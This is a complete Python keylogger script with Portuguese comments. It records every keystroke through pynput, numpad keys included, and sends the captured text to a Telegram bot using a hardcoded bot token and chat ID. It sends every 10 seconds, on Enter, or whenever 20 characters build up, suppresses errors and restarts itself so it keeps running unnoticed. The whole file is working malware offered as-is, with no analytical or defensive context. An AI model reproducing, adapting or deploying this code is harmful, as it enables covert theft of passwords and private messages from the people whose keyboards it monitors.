import requests
from pynput.keyboard import Key, Listener
import time
import threading
import os
import sys

TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
CHAT_ID = "-1004356233671"

buffer = ""

def send_to_telegram(text):
    if text.strip():
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        try:
            requests.post(url, data=payload, timeout=10)
        except:
            pass

def on_press(key):
    global buffer
    try:
        buffer += key.char
    except AttributeError:
        # Captura teclas do Teclado Numérico (Numpad)
        if hasattr(key, 'name') and 'kp_' in str(key).lower():
            num = str(key).replace("Key.kp_", "").replace("'", "")
            if num == "decimal":
                buffer += "."
            elif num == "enter":
                send_to_telegram(buffer + " [ENTER]")
                buffer = ""
            elif num.isdigit():
                buffer += num
            else:
                buffer += f" [{num}] "
        
        # Teclas de controle normais
        elif key == Key.space:
            buffer += " "
        elif key == Key.enter:
            send_to_telegram(buffer + " [ENTER]")
            buffer = ""
        elif key == Key.backspace:
            buffer = buffer[:-1]
        elif key == Key.tab:
            buffer += " [TAB] "
        elif key == Key.shift or key == Key.shift_r or key == Key.ctrl or key == Key.ctrl_l or key == Key.alt or key == Key.alt_gr:
            pass 
        else:
            buffer += f" [{key}] "

    if len(buffer) >= 20:
        send_to_telegram(buffer)
        buffer = ""

def auto_send():
    global buffer
    while True:
        time.sleep(10) 
        if buffer:
            send_to_telegram(buffer + " [AUTO-SEND]")
            buffer = ""

# Inicia a thread de envio automático
threading.Thread(target=auto_send, daemon=True).start()

# Loop principal para manter o keylogger vivo
while True:
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception:
        time.sleep(10)
